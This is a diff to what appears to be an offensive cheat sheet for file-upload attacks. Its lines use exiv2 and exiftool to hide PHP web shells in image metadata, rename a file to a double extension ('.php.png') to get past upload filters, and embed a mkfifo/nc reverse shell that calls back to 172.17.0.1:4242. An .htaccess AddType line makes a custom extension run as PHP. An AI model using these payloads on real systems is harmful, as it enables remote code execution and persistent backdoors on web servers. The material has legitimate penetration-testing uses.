@@ -13,7 +13,16 @@ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
 
 exiftool "-comment<=back.php" back.png
 
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" backs.png
+mv backs.png backs.php.png
+
+exiftool -Comment='<?php echo "<pre>"; system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.0.1 4242 >/tmp/f"); ?>' index.jpg
+
+
+
 ## Upload/Change .htaccess to interpret .blah
 AddType application/x-httpd-php .blah
 
 
+# Extra 1: Download a random image
+wget -c "https://picsum.photos/200" -O image.png
